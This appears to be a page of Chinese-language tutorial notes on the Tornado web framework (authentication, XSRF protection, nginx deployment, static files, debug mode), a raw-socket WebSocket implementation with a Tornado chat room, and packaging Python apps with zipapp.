class LoginHandler(BaseHandler):
    def get(self):
        self.write('<form action="/login" method="post">'
                   '<input type="text" name="name" placeholder="name">'
                   '<input type="submit" value="Sign in">'
                   '</form>')

    def post(self):
        self.set_secure_cookie("user", self.get_argument("name"))
        self.redirect("/")

application = tornado.web.Application([
    (r"/", MainHandler),
    (r"/login", LoginHandler),
], cookie_secret="__TODO:_GENERATE_YOUR_OWN_RANDOM_VALUE_HERE__")

可以使用Python装饰器(decorator) tornado.web.authenticated要求用户登录,如果请求方法带有这个装饰器并且用户没有登录,用户将会被重定向到login_url(另一个应用设置),上面的例子可以被重写:

class MainHandler(BaseHandler):
    @tornado.web.authenticated
    def get(self):
        name = tornado.escape.xhtml_escape(self.current_user)
        self.write("Hello, " + name)

settings = {
    "cookie_secret": "__TODO:_GENERATE_YOUR_OWN_RANDOM_VALUE_HERE__",
    "login_url": "/login",
}
application = tornado.web.Application([
    (r"/", MainHandler),
    (r"/login", LoginHandler),
], **settings)

如果使用authenticated装饰post()方法并且用户没有登录,服务将返回一个403响应,@authenticated装饰器是if not self.current_user: self.redirect()的简写,可能不适合非基于浏览器的登录方案

RequestHandler.current_user
返回请求中被认证的用户,可以使用以下两者之一的方式来设置:
1、子类可以复写get_current_user(),这将会在第一次访问self.current_user时自动被调用,get_current_user()在每次请求时只会被调用一次,并为将来访问做缓存:

def get_current_user(self):
    user_cookie = self.get_secure_cookie("user")
    if user_cookie:
        return json.loads(user_cookie)
    return None

2、它可以被设置为一个普通的变量,通常在来自被复写的prepare():
@gen.coroutine
def prepare(self):
    user_id_cookie = self.get_secure_cookie("user_id")
    if user_id_cookie:
        self.current_user = yield load_user(user_id_cookie)

prepare()可能是一个协程, 尽管get_current_user()可能不是,所以如果加载用户需要异步操作后面的形式是必要的
用户对象可以是application选择的任意类型

【 第三方用户验证 】
tornado.auth模块实现了对一些网络上最流行的网站的身份认证和授权协议,包括Google/Gmail,Facebook,Twitter和FriendFeed,该模块包括通过这些网站登录用户的方法,并在适用情况下允许访问该网站服务的方法,例如下载一个用户的地址簿或在他们支持下发布一条Twitter信息

</pre>这是个使用Google身份认证,在cookie中保存Google的认证信息以供之后访问的示例处理程序<textarea>
class GoogleOAuth2LoginHandler(tornado.web.RequestHandler, tornado.auth.GoogleOAuth2Mixin):
    @tornado.gen.coroutine
    def get(self):
        if self.get_argument('code', False):
            user = yield self.get_authenticated_user(
                redirect_uri='http://your.site.com/auth/google',
                code=self.get_argument('code')
            )
            # Save the user with e.g. set_secure_cookie
        else:
            yield self.authorize_redirect(
                redirect_uri='http://your.site.com/auth/google',
                client_id=self.settings['google_oauth']['key'],
                scope=['profile', 'email'],
                response_type='code',
                extra_params={'approval_prompt': 'auto'}
            )

</textarea><pre>
【 跨站请求伪造(防护) 】
跨站请求伪造(Cross-site request forgery)或XSRF是所有web应用程序面临的一个主要问题
普遍接受的预防XSRF攻击的方案是让每个用户的cookie都是不确定的值,并且把那个cookie值在站点的每个form提交中作为额外的参数包含进来,如果cookie和form提交中的值不匹配,则请求可能是伪造的
Tornado内置XSRF保护,需要在应用设置中使用xsrf_cookies便可以在网站上使用:

settings = {
    "cookie_secret": "__TODO:_GENERATE_YOUR_OWN_RANDOM_VALUE_HERE__",
    "login_url": "/login",
    "xsrf_cookies": True,
}
application = tornado.web.Application([
    (r"/", MainHandler),
    (r"/login", LoginHandler),
], **settings)

如果设置了xsrf_cookies,Tornado web应用程序将会给所有用户设置_xsrf cookie并且拒绝所有不包含一个正确的_xsrf值的POST,PUT或DELETE请求,如果打开这个设置,必须给所有通过POST请求的form提交添加这个字段,可以使用一个特性的UIModule xsrf_form_html()来做这件事情,这个方法在所有模板中都是可用的:

<form action="/new_message" method="post">
  {% module xsrf_form_html() %}
  <input type="text" name="message"/>
  <input type="submit" value="Post"/>
</form>

如果提交一个AJAX的POST请求,也需要在每个请求中给JavaScript添加_xsrf值,这是在FriendFeed为了AJAX的POST请求使用的一个jQuery函数,可以自动的给所有请求添加_xsrf值:

function getCookie(name) {
    var r = document.cookie.match("\\b" + name + "=([^;]*)\\b");
    return r ? r[1] : undefined;
}

jQuery.postJSON = function(url, args, callback) {
    args._xsrf = getCookie("_xsrf");
    $.ajax({url: url, data: $.param(args), dataType: "text", type: "POST",
        success: function(response) {
        callback(eval("(" + response + ")"));
    }});
};

对于PUT和DELETE请求(除了不使用form编码(form-encoded)参数的POST请求,XSRF token也会通过一个X-XSRFToken的HTTP头传递,XSRF cookie 通常在使用xsrf_form_html会设置,但在不使用正规form的纯Javascript应用中,可能需要访问self.xsrf_token手动设置,只读这个属性足够设置cookie了,

如果需要自定义每一个处理程序基础的XSRF行为,可以复写RequestHandler.check_xsrf_cookie(),例如如果有一个没有使用cookie验证的API,可能想禁用XSRF保护,可以通过使check_xsrf_cookie()不做任何处理,然而如果支持基于cookie和非基于cookie的认证,重要的是当前带有cookie认证的请求究竟什么时候使用XSRF保护

【 运行和部署 】
因为Tornado内置了自己的HTTPServer,运行和部署它与其他Python web框架不太一样,需要写一个main()函数来启动服务,而不是配置一个WSGI容器来运行应用

def main():
    app = make_app()
    app.listen(8888)
    IOLoop.current().start()

if __name__ == '__main__':
    main()

配置操作系统或进程管理器来运行这个程序以启动服务,增加每个进程允许打开的最大文件句柄数是可能是必要的(为了避免"Too many open files" 的错误),为了增加这个上限(例如设置为50000)可以使用ulimit命令,修改/etc/security/limits.conf或设置minfds在supervisord配置中

进程和端口
由于Python的GIL(全局解释器锁),为了充分利用多CPU的机器,运行多个Python进程是很有必要的,通常最好是每个CPU运行一个进程

Tornado包含了一个内置的多进程模式来一次启动多个进程,这需要一个在main函数上做点微小的改变

def main():
    app = make_app()
    server = tornado.httpserver.HTTPServer(app)
    server.bind(8888)
    server.start(0)  # forks one process per cpu
    IOLoop.current().start()

这是最简单的方式来启动多进程并让他们共享同样的端口,虽然它有一些局限性,首先,每个子进程将有它自己的IOLoop,所以fork之前不接触全局IOLoop实例是重要的(甚至是间接的),其次在这个模型中很难做到零停机(zero-downtime)更新,最后因为所有的进程共享相同的端口,想单独监控它们就更加困难了

对更复杂的部署,建议启动独立的进程,并让它们各自监听不同的端口,supervisord的"进程组(process groups)"功能是一个很好的方式来安排这些,当每个进程使用不同的端口,一个外部的负载均衡器例如HAProxy或nginx通常需要对外向访客提供一个单一的地址

【 运行在负载均衡器后面 】
当运行在一个负载均衡器例如nginx,建议传递xheaders=True给HTTPServer的构造器,这将告诉Tornado使用类似X-Real-IP这样的HTTP头来获取用户的IP地址而不是把所有流量都认为来自于负载均衡器的IP地址

</pre>这是一份原始的nginx配置文件,在结构上类似于在FriendFeed所使用的配置,这是假设nginx和Tornado server运行在同一台机器上的,并且四个Tornado server正运行在8000-8003端口<textarea>
user nginx;
worker_processes 1;

error_log /var/log/nginx/error.log;
pid /var/run/nginx.pid;

events {
    worker_connections 1024;
    use epoll;
}

http {
    # Enumerate all the Tornado servers here
    upstream frontends {
        server 127.0.0.1:8000;
        server 127.0.0.1:8001;
        server 127.0.0.1:8002;
        server 127.0.0.1:8003;
    }

    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    access_log /var/log/nginx/access.log;

    keepalive_timeout 65;
    proxy_read_timeout 200;
    sendfile on;
    tcp_nopush on;
    tcp_nodelay on;
    gzip on;
    gzip_min_length 1000;
    gzip_proxied any;
    gzip_types text/plain text/html text/css text/xml
               application/x-javascript application/xml
               application/atom+xml text/javascript;

    # Only retry if there was a communication error, not a timeout
    # on the Tornado server (to avoid propagating "queries of death"
    # to all frontends)
    proxy_next_upstream error;

    server {
        listen 80;

        # Allow file uploads
        client_max_body_size 50M;

        location ^~ /static/ {
            root /var/www;
            if ($query_string) {
                expires max;
            }
        }
        location = /favicon.ico {
            rewrite (.*) /static/favicon.ico;
        }
        location = /robots.txt {
            rewrite (.*) /static/robots.txt;
        }

        location / {
            proxy_pass_header Server;
            proxy_set_header Host $http_host;
            proxy_redirect off;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Scheme $scheme;
            proxy_pass http://frontends;
        }
    }
}

</textarea><pre>
【 静态文件和文件缓存 】
Tornado中可以通过在应用程序中指定特殊的static_path来提供静态文件服务:

settings = {
    "static_path": os.path.join(os.path.dirname(__file__), "static"),
    "cookie_secret": "__TODO:_GENERATE_YOUR_OWN_RANDOM_VALUE_HERE__",
    "login_url": "/login",
    "xsrf_cookies": True,
}
application = tornado.web.Application([
    (r"/", MainHandler),
    (r"/login", LoginHandler),
    (r"/(apple-touch-icon\.png)", tornado.web.StaticFileHandler, dict(path=settings['static_path'])),
], **settings)

这些设置将自动的把所有以/static/开头的请求从static目录进行提供,http://localhost:8888/static/foo.png将会通过指定的static目录提供foo.png文件,也自动的会从static目录提供/robots.txt和/favicon.ico,尽管它们并没有以/static/前缀开始

在上面的设置中,明确的配置Tornado提供apple-touch-icon.png文件从StaticFileHandler根下,虽然文件在static文件目录中,(正则表达式捕获组必须告诉StaticFileHandler请求的文件名;调用捕获组把文件名作为方法的参数传递给处理程序)可以做同样的事情e.g.从网站的根提供sitemap.xml文件,当然也可以通过在HTML中使用link标签来避免伪造根目录的apple-touch-icon.png

为了改善性能, 通常情况下让浏览器主动缓存静态资源是个好主意,这样浏览器就不会发送不必要的可能在渲染页面时阻塞的If-Modified-Since或Etag请求了,Tornado使用静态内容版本(static content versioning)来支持此项功能

为了使用这些功能,在模板中使用static_url方法而不是直接在HTML中输入静态文件的URL
< title>FriendFeed - {{ _("Home") }}< /title>
< div>< img src="{{ static_url("images/logo.png") }}"/>< /div>

static_url()函数将把相对路径翻译成一个URI类似于/static/images/logo.png?v=aae54,其中的v参数是logo.png内容的哈希(hash),并且它的存在使得Tornado服务向用户的浏览器发送缓存头,这将使浏览器无限期的缓存内容

因为参数v是基于文件内容的,如果更新一个文件并重启服务,它将发送一个新的v值,所以用户的浏览器将会自动的拉去新的文件,如果文件的内容没有改变,浏览器将会继续使用本地缓存的副本,而不会从服务器检查更新,显著的提高了渲染性能

在生产中可能想提供静态文件通过一个更优的静态服务器,比如nginx,可以配置任何web服务器识别通过static_url()提供的版本标签并相应的设置缓存头,下面是在FriendFeed使用的nginx相关配置的一部分:

location /static/ {
    root /var/friendfeed/static;
    if ($query_string) {
        expires max;
    }
}

【 Debug模式和自动重载 】
如果传递debug=True配置给Application的构造函数,应用程序将会运行在debug/开发模式,在这个模式下为了方便于开发的一些功能将被启用,每一个也可以作为独立的标签使用;如果它们都被专门指定,那它们都将获得独立的优先级
1、autoreload=True: 应用程序将会观察它的源文件是否改变,并且当任何文件改变的时候便重载它自己,这减少了在开发中需要手动重启服务的需求,然而在debug模式下某些错误(例如import的时候有语法错误)会导致服务关闭,并且无法自动恢复
2、compiled_template_cache=False: 模板将不会被缓存
3、static_hash_cache=False: 静态文件哈希(被static_url函数使用)将不会被缓存
4、serve_traceback=True: 当一个异常在RequestHandler中没有捕获,将会生成一个包含调用栈信息的错误页

自动重载(autoreload)模式和HTTPServer的多进程模式不兼容,不能给HTTPServer.start传递1以外的参数(或调用tornado.process.fork_processes) 当使用自动重载模式的时候

debug模式的自动重载功能可作为一个独立的模块位于tornado.autoreload,以下两者可以结合使用,在语法错误之时提供额外的健壮性:设置autoreload=True可以在app运行时检测文件修改,还有启动python -m tornado.autoreload myserver.py来捕获任意语法错误或其他的启动时错误

重载会丢失任何Python解释器命令行参数,因为它使用sys.executable和sys.argv重新执行Python,此外修改这些变量将造成重载错误

在一些平台(包括Windows和Mac OSX 10.6之前), 进程不能被"原地"更新,所以当检测到代码更新,旧服务就会退出然后启动一个新服务,这已经被公知来混淆一些IDE

【 WSGI和Google App Engine 】
Tornado通常是独立运行的,不需要一个WSGI容器,然而在一些环境中(例如Google App Engine)只运行WSGI,应用程序不能独立运行自己的服务,在这种情况下Tornado支持一个有限制的操作模式,不支持异步操作但允许一个Tornado's功能的子集在仅WSGI环境中,以下功能在WSGI模式下是不支持的, 包括协程, @asynchronous装饰器, AsyncHTTPClient, auth模块和WebSockets

可以使用tornado.wsgi.WSGIAdapter把一个Tornado Application转换成WSGI应用,在这个例子中配置WSGI容器发现application对象:

</pre><textarea>
import tornado.web
import tornado.wsgi

class MainHandler(tornado.web.RequestHandler):
    def get(self):
        self.write("Hello, world")

tornado_app = tornado.web.Application([
    (r"/", MainHandler),
])
application = tornado.wsgi.WSGIAdapter(tornado_app)

</textarea>
</div>

<div id="websocket">
<h3>websocket</h3><pre>
### 服务端
import socket,base64,hashlib

def get_headers(data):
    '''将请求头转换为字典'''
    header_dict = {}
    data = str(data,encoding="utf-8")

    header,body = data.split("\r\n\r\n",1)
    header_list = header.split("\r\n")
    for i in range(0,len(header_list)):
        if i == 0:
            if len(header_list[0].split(" ")) == 3:
                header_dict['method'],header_dict['url'],header_dict['protocol'] = header_list[0].split(" ")
        else:
            k,v=header_list[i].split(":",1)
            header_dict[k]=v.strip()
    return header_dict

sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
sock.bind(("127.0.0.1",8080))
sock.listen(5)

#等待用户连接
conn,addr = sock.accept()
print("conn from ",conn,addr)
#获取握手消息,magic string ,sha1加密
#发送给客户端
#握手消息
data = conn.recv(8096)
headers = get_headers(data)

# 对请求头中的sec-websocket-key进行加密
response_tpl = "HTTP/1.1 101 Switching Protocols\r\n" \
      "Upgrade:websocket\r\n" \
      "Connection: Upgrade\r\n" \
      "Sec-WebSocket-Accept: %s\r\n" \
      "WebSocket-Location: ws://%s%s\r\n\r\n"

magic_string = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11'

value = headers['Sec-WebSocket-Key'] + magic_string
ac = base64.b64encode(hashlib.sha1(value.encode('utf-8')).digest())

response_str = response_tpl % (ac.decode('utf-8'), headers['Host'], headers['url'])

# 响应【握手】信息
conn.send(bytes(response_str, encoding='utf-8'))

'''
请求头
b'
GET / HTTP/1.1\r\n
Host: 127.0.0.1:8080\r\n
Connection: Upgrade\r\n
Pragma: no-cache\r\n
Cache-Control: no-cache\r\n
Upgrade: websocket\r\n
Origin: http://localhost:63342\r\n
Sec-WebSocket-Version: 13\r\n
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36\r\n
Accept-Encoding: gzip, deflate, br\r\n
Accept-Language: zh-CN,zh;q=0.8\r\n
Sec-WebSocket-Key: +uL/aiakjNABjEoMzAqm6Q==\r\n
Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits\r\n\r\n'
'''

### 客户端,浏览器
ws =new WebSocket("ws://127.0.0.1:8080");
ws.onopen = function (ev) { //若是连接成功,onopen函数会执行
    console.log(22222)
}

### 数据接收规则
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-------+-+-------------+-------------------------------+
|F|R|R|R| opcode|M| Payload len |    Extended payload length    |　　#Payload len(第二个字节的前七位,最大127)决定头部的长度
|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |　　#若是小于126：Extended payload length扩展头部长度为0字节,后面全部为主体数据
|N|V|V|V|       |S|             |   (if payload len==126/127)   |　　#若是等于126：Extended payload length扩展头部长度为2字节,后面全部为主体数据
| |1|2|3|       |K|             |                               |　　#若是等于127：Extended payload length扩展头部长度为8字节,后面全部为主体数据
+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
|     Extended payload length continued, if payload len == 127  |　　#注意：主体数据中的前四位为mask掩码,用于后面的消息的解码,解码方式为循环异或操作
+ - - - - - - - - - - - - - - - +-------------------------------+
|                               |Masking-key, if MASK set to 1  |　　#数据过长,需要分部发送,这时需要FIN和opcode
+-------------------------------+-------------------------------+
| Masking-key (continued)       |          Payload Data         |
+-------------------------------- - - - - - - - - - - - - - - - +
:                     Payload Data continued ...                :
+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
|                     Payload Data continued ...                |
+---------------------------------------------------------------+

### 实现规则解码
def get_data(info):    #info是我们连接后,接受的数据
    payload_len = info[1] & 127
    if payload_len == 126:
        extend_payload_len = info[2:4]
        mask = info[4:8]
        decoded = info[8:]
    elif payload_len == 127:
        extend_payload_len = info[2:10]
        mask = info[10:14]
        decoded = info[14:]
    else:
        extend_payload_len = None
        mask = info[2:6]
        decoded = info[6:]

    bytes_list = bytearray()    #这里我们使用字节将数据全部收集,再去字符串编码,这样不会导致中文乱码
    for i in range(len(decoded)):
        chunk = decoded[i] ^ mask[i % 4]
        bytes_list.append(chunk)
    body = str(bytes_list, encoding='utf-8')
    return body

### 实现循环获取数据
## 服务器端
import socket,base64,hashlib

def get_headers(data):
    '''将请求头转换为字典'''
    header_dict = {}
    data = str(data,encoding="utf-8")

    header,body = data.split("\r\n\r\n",1)
    header_list = header.split("\r\n")
    for i in range(0,len(header_list)):
        if i == 0:
            if len(header_list[0].split(" ")) == 3:
                header_dict['method'],header_dict['url'],header_dict['protocol'] = header_list[0].split(" ")
        else:
            k,v=header_list[i].split(":",1)
            header_dict[k]=v.strip()
    return header_dict

def get_data(info):
    payload_len = info[1] & 127
    if payload_len == 126:
        extend_payload_len = info[2:4]
        mask = info[4:8]
        decoded = info[8:]
    elif payload_len == 127:
        extend_payload_len = info[2:10]
        mask = info[10:14]
        decoded = info[14:]
    else:
        extend_payload_len = None
        mask = info[2:6]
        decoded = info[6:]

    bytes_list = bytearray()    #这里我们使用字节将数据全部收集,再去字符串编码,这样不会导致中文乱码
    for i in range(len(decoded)):
        chunk = decoded[i] ^ mask[i % 4]    #解码方式
        bytes_list.append(chunk)
    body = str(bytes_list, encoding='utf-8')
    return body

sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
sock.bind(("127.0.0.1",8080))
sock.listen(5)

#等待用户连接
conn,addr = sock.accept()
print("conn from ",conn,addr)
#获取握手消息,magic string ,sha1加密
#发送给客户端
#握手消息
data = conn.recv(8096)

headers = get_headers(data)

# 对请求头中的sec-websocket-key进行加密
response_tpl = "HTTP/1.1 101 Switching Protocols\r\n" \
      "Upgrade:websocket\r\n" \
      "Connection: Upgrade\r\n" \
      "Sec-WebSocket-Accept: %s\r\n" \
      "WebSocket-Location: ws://%s%s\r\n\r\n"

magic_string = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11'

value = headers['Sec-WebSocket-Key'] + magic_string
ac = base64.b64encode(hashlib.sha1(value.encode('utf-8')).digest())

response_str = response_tpl % (ac.decode('utf-8'), headers['Host'], headers['url'])

# 响应【握手】信息
conn.send(bytes(response_str, encoding='utf-8'))

#可以进行通信
while True:
    data = conn.recv(8096)
    data = get_data(data)
    print(data)

## 客户端代码
ws =new WebSocket("ws://127.0.0.1:8080");
ws.onopen = function (ev) { //若是连接成功,onopen函数会执行
    console.log(22222);
    ws.send("你好");
}

### 数据发送规则(需要发送二进制包struct模块)
def send_msg(conn, msg_bytes):　　
    """
    WebSocket服务端向客户端发送消息
    :param conn: 客户端连接到服务器端的socket对象,即： conn,address = socket.accept()
    :param msg_bytes: 向客户端发送的字节
    :return:
    """
    import struct

    token = b"\x81"　　#接收的第一字节,一般都是x81不变
    length = len(msg_bytes)
    if length < 126:
        token += struct.pack("B", length)
    elif length <= 0xFFFF:
        token += struct.pack("!BH", 126, length)
    else:
        token += struct.pack("!BQ", 127, length)

    msg = token + msg_bytes
    conn.send(msg)
    return True

### 实现发送数据
import socket,base64,hashlib

def get_headers(data):
    '''将请求头转换为字典'''
    header_dict = {}
    data = str(data,encoding="utf-8")

    header,body = data.split("\r\n\r\n",1)
    header_list = header.split("\r\n")
    for i in range(0,len(header_list)):
        if i == 0:
            if len(header_list[0].split(" ")) == 3:
                header_dict['method'],header_dict['url'],header_dict['protocol'] = header_list[0].split(" ")
        else:
            k,v=header_list[i].split(":",1)
            header_dict[k]=v.strip()
    return header_dict

def get_data(info):
    payload_len = info[1] & 127
    if payload_len == 126:
        extend_payload_len = info[2:4]
        mask = info[4:8]
        decoded = info[8:]
    elif payload_len == 127:
        extend_payload_len = info[2:10]
        mask = info[10:14]
        decoded = info[14:]
    else:
        extend_payload_len = None
        mask = info[2:6]
        decoded = info[6:]

    bytes_list = bytearray()    #这里我们使用字节将数据全部收集,再去字符串编码,这样不会导致中文乱码
    for i in range(len(decoded)):
        chunk = decoded[i] ^ mask[i % 4]    #解码方式
        bytes_list.append(chunk)
    body = str(bytes_list, encoding='utf-8')
    return body

def send_msg(conn, msg_bytes):
    """
    WebSocket服务端向客户端发送消息
    :param conn: 客户端连接到服务器端的socket对象,即： conn,address = socket.accept()
    :param msg_bytes: 向客户端发送的字节
    :return:
    """
    import struct

    token = b"\x81" #接收的第一字节,一般都是x81不变
    length = len(msg_bytes)
    if length < 126:
        token += struct.pack("B", length)
    elif length <= 0xFFFF:
        token += struct.pack("!BH", 126, length)
    else:
        token += struct.pack("!BQ", 127, length)

    msg = token + msg_bytes
    conn.send(msg)
    return True

sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
sock.bind(("127.0.0.1",8080))
sock.listen(5)

#等待用户连接
conn,addr = sock.accept()
#获取握手消息,magic string ,sha1加密
#发送给客户端
#握手消息
data = conn.recv(8096)

headers = get_headers(data)

# 对请求头中的sec-websocket-key进行加密
response_tpl = "HTTP/1.1 101 Switching Protocols\r\n" \
      "Upgrade:websocket\r\n" \
      "Connection: Upgrade\r\n" \
      "Sec-WebSocket-Accept: %s\r\n" \
      "WebSocket-Location: ws://%s%s\r\n\r\n"

magic_string = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11'

value = headers['Sec-WebSocket-Key'] + magic_string
ac = base64.b64encode(hashlib.sha1(value.encode('utf-8')).digest())

response_str = response_tpl % (ac.decode('utf-8'), headers['Host'], headers['url'])

# 响应【握手】信息
conn.send(bytes(response_str, encoding='utf-8'))

#可以进行通信
while True:
    data = conn.recv(8096)
    data = get_data(data)
    print(data)
    send_msg(conn,bytes(data+"geah",encoding="utf-8"))

### 前端onmessage 当书记接收会触发
ws =new WebSocket("ws://127.0.0.1:8080");
ws.onopen = function (ev) { //若是连接成功,onopen函数会执行
    console.log(22222);
    ws.send("你好");
}
ws.onmessage = function (ev) {
    console.log(ev);
}

</pre>tornado实现websocket聊天室<textarea>
### 服务端
import tornado.ioloop
import tornado.web
import tornado.websocket
import datetime

class MainHandler(tornado.web.RequestHandler):
    def get(self):

        self.render("s1.html")

    def post(self, *args, **kwargs):
        pass

users = set()
class ChatHandler(tornado.websocket.WebSocketHandler):
    def open(self, *args, **kwargs):
        '''客户端连接'''
        print("connect....")
        print(self.request)
        users.add(self)

    def on_message(self, message):
        '''有消息到达'''
        now = datetime.datetime.now()
        content = self.render_string("recv_msg.html",date=now.strftime("%Y-%m-%d %H:%M:%S"),msg=message)
        for client in users:
            if client == self:
                continue
            client.write_message(content)

    def on_close(self):
        '''客户端主动关闭连接'''
        users.remove(self)


st ={
    "template_path": "template",#模板路径配置
    "static_path":'static',
}

#路由映射   匹配执行,否则404
application = tornado.web.Application([
    ("/index",MainHandler),
    ("/wschat",ChatHandler),
],**st)

if __name__=="__main__":
    application.listen(8080)

    #io多路复用
    tornado.ioloop.IOLoop.instance().start()

### 前端模板
< !DOCTYPE html>
< html lang="en">
< head>
    < meta charset="utf-8">
    < meta name="viewport" content="width=device-width, initial-scale=1.0">
    < link href="/static/css/bootstrap.min.css" rel="stylesheet">
    < link href="/static/css/nifty.min.css" rel="stylesheet">
    < link href="/static/css/demo/nifty-demo-icons.min.css" rel="stylesheet">
    < link href="/static/css/demo/nifty-demo.min.css" rel="stylesheet">
    < link href="/static/plugins/pace/pace.min.css" rel="stylesheet">
    < script src="/static/js/jquery-2.2.4.min.js">< /script>
    < script src="/static/plugins/pace/pace.min.js">< /script>
    < script src="/static/js/bootstrap.min.js">< /script>
    < script src="/static/js/nifty.min.js">< /script>
    < script src="/static/js/demo/nifty-demo.min.js">< /script>
    < script src="/static/plugins/flot-charts/jquery.flot.min.js">< /script>
    < script src="/static/plugins/flot-charts/jquery.flot.resize.min.js">< /script>
    < script src="/static/plugins/gauge-js/gauge.min.js">< /script>
    < script src="/static/plugins/skycons/skycons.min.js">< /script>
    < script src="/static/plugins/easy-pie-chart/jquery.easypiechart.min.js">< /script>
    < script src="/static/js/demo/widgets.js">< /script>
< /head>
< body>
< div id="container" class="effect  aside-bright mainnav-sm aside-right aside-in">
    < div class="boxed">
        < div id="content-container">
            < div class="row">
                < div class="col-md-8 col-lg-8 col-sm-8">

            <!--Chat widget-->
            <!--===================================================-->
            < div class="panel" style="height: 640px">
                <!--Heading-->
                < div class="panel-heading">
                    < h3 class="panel-title">Chat< /h3>
                < /div>

                <!--Widget body-->
                < div style="height:510px;padding-top:0px;" class="widget-body">
                    < div class="nano">
                        < div class="nano-content pad-all">
                            < ul class="list-unstyled media-block">< /ul>
                        < /div>
                    < /div>

                    <!--Widget footer-->
                    < div class="panel-footer" style="height: 90px;">
                        < div class="row">
                            < div class="col-xs-9">
                                < input type="text" placeholder="Enter your text" class="form-control chat-input">
                            < /div>
                            < div class="col-xs-3">
                                < button class="btn btn-primary btn-block" onclick="sendMsg(this);" type="submit">Send< /button>
                            < /div>
                        < /div>
                    < /div>
                < /div>
            < /div>
            <!--===================================================-->
            <!--Chat widget-->

        < /div>
                < div class="col-md-4 col-lg-4 col-sm-4">
                    < aside id="aside-container">
                < div id="aside">
                    < div class="nano has-scrollbar">
                        < div class="nano-content" tabindex="0" style="right: -17px;">
                            <!--Nav tabs-->
                            <!--================================-->
                            < ul class="nav nav-tabs nav-justified">
                                < li class="active">
                                    < a href="#demo-asd-tab-1" data-toggle="tab">
                                        < i class="demo-pli-speech-bubble-7"></i>
                                    < /a>
                                < /li>
                            < /ul>
                            <!--================================-->
                            <!--End nav tabs-->

                            <!-- Tabs Content -->
                            <!--================================-->
                            < div class="tab-content">
                                < div class="tab-pane fade in active" id="demo-asd-tab-1">
                                    < p class="pad-hor text-semibold text-main">
                                        < span class="pull-right badge badge-success">0</span> Friends
                                    < /p>

                                < /div>
                            < /div>
                        < /div>
                    < div class="nano-pane" style="display: none;">< div class="nano-slider" style="height: 4059px; transform: translate(0px, 0px);">< /div>< /div>< /div>
                < /div>
            < /aside>
                < /div>
            < /div>
        < /div>
    < /div>
< /div>
< /body>
< /html>

< script>
    ws = new WebSocket("ws://127.0.0.1:8080/wschat");

    function sendMsg(ths) {
        var dt = new Date()
        var now_time = dt.toLocaleString();

        var msg = $(ths).parents(".row").find(".chat-input").val();
        $(ths).parents(".row").find(".chat-input").empty();
        var li = '< li class="mar-btm">< div class="media-right">< img src="" class="img-circle img-sm" alt="Profile Picture">< /div>';
        li += '< div class="media-body pad-hor speech-right">< div class="speech">< a href="#" class="media-heading">游客< /a>';
        li += '< p>'+msg+'< /p>';
        li += '< p class="speech-time">';
        li += '< i class="demo-pli-clock icon-fw">< /i>'+now_time;
        li += '</ p>< /div>< /div>< /li>';
        $(ths).parents(".widget-body").find(".list-unstyled").append(li);
        $(ths).parents(".panel-footer").find(".chat-input").val("");
        ws.send(msg);
    }

    ws.onmessage=function (ev) {
        $(".list-unstyled").append(ev.data);
    }
< /script>

### 消息插件
<li class="mar-btm">
    <div class="media-left">
        < img src="img/profile-photos/1.png" class="img-circle img-sm" alt="Profile Picture">
    </div>
    <div class="media-body pad-hor">
        <div class="speech">
            <a href="#" class="media-heading">游客</a>
            <p>{{msg}}</p>
            <p class="speech-time">
            <i class="demo-pli-clock icon-fw"></i>{{date}}
            </p>
        </div>
    </div>
</li>

</textarea>
</div>

<div id="publish">
<h3>Python打包和发布(常用工具:zipapp和pyinstaller)</h3><pre>
zipapp模块主要用于将Python应用打包成一个.pyz文件,同时无论开发Python应用时有多少源文件和依赖包,使用zipapp都可以将它们打包成一个.pyz文件,不足之处是该文件依然需要Python环境来执行。

pyinstaller工具则更强大,它可以直接将Python程序打包成可执行程序,该工具跨平台,使用非常方便。使用pyinstaller打包出来的程序完全可以被分发到对应平台的的目标机器上直接运行,无须在目标机器上安装Python解释器环境。

</pre>

<h4>zipapp打包</h4><pre>
Python内置的zipapp模块可以将一个Python模块(可能包含很多个源程序)打包成一个Python应用,甚至发布成一个Windows的可执行程序
zipapp模块用于将单个Python文件或整个目录下的所有文件打包成可执行的Python档案包。

python -m zipapp source [options]
source参数代表要打包的Python源程序或目录,是单个的Python文件或文件夹,如果是文件夹则会打包该文件夹中的所有Python文件。

options支持如下选项:
-o < output>,--output=< output>:指定输出档案包的文件名,默认source参数值加上.pyz后缀。
-p < interpreter>,--python=< interpreter>:指定Python解释器。
-m < mainfn>,--main=< mainfn>:指定Python程序的入口函数,该选项应该为pkg.mod:fn形式,其中pkg.mod是一个档案包中的包或模块,fn指定模块中的函数。如果不指定该选项则默认从模块中的__main__.py文件开始执行。
-c,--compress:从Python3.7开始支持该选项。该选项用于指定是否对档案包进行压缩来减小文件的大小,默认不压缩。
--info:用于在诊断时显示档案包中的解释器。
-h,--help:用于显示zipapp模块的帮助信息。

</pre><textarea>
# 下面在某目录下建立一个app子目录,该子目录用于包含多个Python程序。首先在该目录下开发一个say_hello.py程序:
def say_hello(name):
    return name + ",您好！"

# 然后在该目录下开发一个app.py程序来使用say_hello模块:
from say_hello import *
def main():
    print('程序开始执行')
    print(say_hello('孙悟空'))

# 在命令行工具中进入该目录(app目录的父目录),然后执行如下命令:
python -m zipapp app -o first.pyz -m "app:main"

